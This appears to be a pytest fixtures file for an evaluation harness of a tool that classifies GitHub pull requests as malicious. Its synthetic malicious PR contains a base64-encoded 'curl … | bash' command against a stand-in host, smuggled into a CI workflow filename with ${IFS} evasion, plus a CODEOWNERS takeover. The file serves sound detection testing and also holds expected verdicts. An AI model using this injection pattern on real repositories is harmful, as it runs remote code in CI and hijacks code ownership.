"""Shared fixtures for diff-sentry-eval tests — SYNTHETIC in-code traces (the diff_sentry test style),
never gitignored `output/traces/` artifacts, so the suite runs on a fresh clone / in CI with zero creds.

The verdict + evidence are driven through a real `scan_indicators` baseline + the result event's judgement,
exactly as `diff_sentry.assemble.verdict_from_events` re-sources them on read.
"""

from __future__ import annotations

import base64

import pytest

from diff_sentry_eval.taskset import EvalTask

# A hackerbot-claw-style filename payload: base64 of a pipe-to-shell command, smuggled with ${IFS}
# space-evasion inside a command substitution a CI workflow could interpolate into a shell step.
_CMD = "curl -sSfL http://evil.example/m | bash"
_B64 = base64.b64encode(_CMD.encode()).decode()
_MALICIOUS_FILENAME = f"$(echo${{IFS}}{_B64}|base64${{IFS}}-d|bash)"

MALICIOUS_CHANGE = {
    "repo": "acme/widgets", "kind": "pull_request", "number": 7, "author": "hackerbot-claw",
    "title": "Add CI helper", "body": "Small workflow tweak.",
    "files": [
        {"filename": ".github/workflows/ci.yml", "status": "modified", "additions": 3, "deletions": 0,
         "patch": f"+      - run: ls '{_MALICIOUS_FILENAME}'\n"},
        {"filename": "CODEOWNERS", "status": "modified", "additions": 1, "deletions": 0,
         "patch": "+* @hackerbot-claw\n"},
    ],
}

_MALICIOUS_VERDICT = {
    "summary": "A CI workflow change smuggles a base64 pipe-to-shell payload and reassigns CODEOWNERS.",
    "verdict": "malicious", "confidence": 0.95,
    "rationale": "The filename decodes to `curl … | bash` and the change grabs CODEOWNERS.",
    "techniques": ["ci-shell-injection", "obfuscated-payload", "codeowners-tamper"],
    "suspect_files": [".github/workflows/ci.yml", "CODEOWNERS"],
    "indicator_ids": [], "recommended_action": "block-merge",
}

# A verdict with NO usable label (empty string) → inconclusive → an `unscored` row (not a fake 0).
_EMPTY_VERDICT = {"summary": "", "verdict": "", "confidence": 0.0, "rationale": "",
                  "techniques": [], "suspect_files": [], "indicator_ids": [], "recommended_action": "allow"}


def record_run(tmp_path, *, run_id, with_result=True, verdict=None, change=None,
               emit_on=("suspicious", "malicious"), max_iterations=25):
    """Write a synthetic diff-sentry run to `tmp_path/<run_id>.jsonl` through the REAL TraceRecorder, so the
    load_events → group_by_run path is exercised against the actual wire format. `with_result=False` → the
    run never finalized; `verdict` defaults to a malicious verdict (pass `_EMPTY_VERDICT` for an
    inconclusive run). Returns the run's events."""
    from rlm_kit import TraceRecorder, record_tool_call
    from rlm_kit.trace import load_events

    from diff_sentry.indicators import scan_indicators
    from diff_sentry.normalize import event_metadata, normalize_event, raw_content
    from diff_sentry.rubric import default_rubric, rubric_to_meta

    change = MALICIOUS_CHANGE if change is None else change
    verdict = _MALICIOUS_VERDICT if verdict is None else verdict
    path = str(tmp_path / f"{run_id}.jsonl")
    baseline = [h.model_dump() for h in scan_indicators(raw_content(change))]
    meta_source = event_metadata(change)
    meta = {
        "event": normalize_event(change),
        "instructions": "You classify ONE GitHub change…",
        "source": {k: meta_source.get(k) for k in ("repo", "kind", "number", "author", "title",
                                                    "file_count", "content_sha256")},
        "baseline_indicators": baseline, "emit_on": list(emit_on),
        "planner": "planner-x", "analyst": "analyst-x", "classifier": "classifier-x",
        "max_iterations": max_iterations, "max_llm_calls": 8,
        "rubric": rubric_to_meta(default_rubric()),
    }
    with TraceRecorder(path, run_id=run_id, meta=meta) as rec:
        record_tool_call("read_skill", args={"name": "triage-a-change"}, result_len=900,
                         preview="# Triage a change ...")
        region_hits = scan_indicators(raw_content(change))
        record_tool_call("scan_indicators", args={"region": "decoded filename"}, ok=True,
                         hits=[h.model_dump() for h in region_hits], n=len(region_hits))
        record_tool_call("deep_classify", args={"findings": "ci filename decodes to curl|bash"},
                         ok=True, raw='{"verdict":"malicious"}', verdict="malicious", confidence=0.9,
                         techniques=["ci-shell-injection"], errors=[])
        rec.record("main_step", {"reasoning": "read skill, scan the workflow diff", "code": "scan_indicators(region)"})
        rec.record("main_step", {"reasoning": "decode base64 filename, confirm curl|bash", "code": "SUBMIT(...)"})
        rec.record("sub_call", {"model": "test/analyst", "input": "does this reach a sink?", "processed": "yes"})
        if with_result:
            rec.record_result(verdict)
    return load_events(path, run_id)


@pytest.fixture
def demo_task():
    return EvalTask(id="demo-malicious-ci", change=MALICIOUS_CHANGE,
                    reference="malicious: a CI curl|bash injection plus a CODEOWNERS reassignment")


@pytest.fixture
def scored_events(tmp_path):
    return record_run(tmp_path, run_id="demo-malicious-ci")


@pytest.fixture
def no_result_events(tmp_path):
    return record_run(tmp_path, run_id="demo-malicious-ci", with_result=False)


@pytest.fixture
def inconclusive_events(tmp_path):
    # finalized but with an EMPTY verdict label → inconclusive → an `unscored` row (never a fake 0)
    return record_run(tmp_path, run_id="demo-malicious-ci", verdict=_EMPTY_VERDICT)
